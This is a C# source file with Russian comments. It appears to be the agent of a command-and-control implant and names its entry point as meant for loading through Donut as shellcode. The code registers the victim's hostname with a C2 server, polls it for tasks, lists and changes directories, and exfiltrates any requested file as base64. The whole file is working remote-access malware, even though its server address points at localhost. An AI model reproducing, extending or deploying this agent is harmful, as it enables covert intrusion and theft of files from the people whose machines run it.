using System;
using System.IO;
using System.Net;
using System.Text;

public class Runner
{
    // Точка входа для Donut
    public static void Start(string args)
    {
        // Все переменные и объекты объявляются локально
        string serverUrl = "http://localhost:5000";
        string clientId = Guid.NewGuid().ToString().Substring(0, 8);

        // Основной цикл работы
        MainLoop(serverUrl, clientId);
    }

    private static void MainLoop(string serverUrl, string clientId)
    {
        // Регистрация
        while (true)
        {
            try
            {
                string info = "{\"client_id\":\"" + clientId + "\",\"hostname\":\"" + Environment.MachineName + "\",\"os\":\"windows\"}";
                Transmit(serverUrl, "/api/register", info);
                break;
            }
            catch
            {
                Delay(5000);
            }
        }

        // Основной цикл задач
        while (true)
        {
            try
            {
                string raw = DownloadString(serverUrl + "/api/tasks/" + clientId);
                if (!string.IsNullOrEmpty(raw) && raw.Contains("\"id\""))
                {
                    string tid = Extract(raw, "\"id\":\"", "\"");
                    string cmd = Extract(raw, "\"command\":\"", "\"");
                    string arg = Extract(raw, "\"args\":\"", "\"");

                    string result = HandleTask(cmd, arg);
                    Transmit(serverUrl, "/api/results/" + clientId, "{\"task_id\":\"" + tid + "\",\"result\":" + result + "}");
                }
            }
            catch { }
            Delay(3000);
        }
    }

    // Минимальный HTTP POST
    private static string Transmit(string serverUrl, string path, string json)
    {
        var req = (HttpWebRequest)WebRequest.Create(serverUrl + path);
        req.Method = "POST";
        req.ContentType = "application/json";
        byte[] data = Encoding.UTF8.GetBytes(json);
        req.ContentLength = data.Length;
        using (var stream = req.GetRequestStream())
            stream.Write(data, 0, data.Length);
        using (var resp = (HttpWebResponse)req.GetResponse())
        using (var sr = new StreamReader(resp.GetResponseStream()))
            return sr.ReadToEnd();
    }

    // Минимальный HTTP GET
    private static string DownloadString(string url)
    {
        var req = (HttpWebRequest)WebRequest.Create(url);
        req.Method = "GET";
        using (var resp = (HttpWebResponse)req.GetResponse())
        using (var sr = new StreamReader(resp.GetResponseStream()))
            return sr.ReadToEnd();
    }

    // Минимальная задержка без Thread.Sleep
    private static void Delay(int ms)
    {
        var until = DateTime.UtcNow.AddMilliseconds(ms);
        while (DateTime.UtcNow < until) ;
    }

    // Примитивный парсер JSON
    private static string Extract(string source, string startStr, string endStr)
    {
        try
        {
            int start = source.IndexOf(startStr) + startStr.Length;
            int end = source.IndexOf(endStr, start);
            return source.Substring(start, end - start);
        }
        catch { return ""; }
    }

    private static string HandleTask(string cmd, string args)
    {
        try
        {
            switch ((cmd ?? "").ToLower())
            {
                case "ls":
                    string target = string.IsNullOrEmpty(args) ? "." : args;
                    StringBuilder sb = new StringBuilder("{\"path\":\"" + Path.GetFullPath(target).Replace("\\", "\\\\") + "\",\"entries\":[");
                    string[] dirs = Directory.GetDirectories(target);
                    string[] files = Directory.GetFiles(target);

                    foreach (var d in dirs)
                        sb.Append("{\"name\":\"" + Path.GetFileName(d) + "\",\"is_dir\":true},");
                    foreach (var f in files)
                        sb.Append("{\"name\":\"" + Path.GetFileName(f) + "\",\"is_dir\":false,\"size\":" + new FileInfo(f).Length + "},");

                    return sb.ToString().TrimEnd(',') + "]}";

                case "cd":
                    Directory.SetCurrentDirectory(args);
                    return "{\"output\":\"Changed to " + Directory.GetCurrentDirectory().Replace("\\", "\\\\") + "\"}";

                case "pwd":
                    return "{\"output\":\"" + Directory.GetCurrentDirectory().Replace("\\", "\\\\") + "\"}";

                case "download":
                    if (!File.Exists(args)) return "{\"error\":\"File not found\"}";
                    byte[] fileBytes = File.ReadAllBytes(args);
                    return "{\"filename\":\"" + Path.GetFileName(args) + "\",\"data_b64\":\"" + Convert.ToBase64String(fileBytes) + "\"}";

                case "ping":
                    return "{\"output\":\"pong\"}";

                default:
                    return "{\"error\":\"Unknown command\"}";
            }
        }
        catch (Exception e)
        {
            return "{\"error\":\"" + e.Message.Replace("\"", "'") + "\"}";
        }
    }
}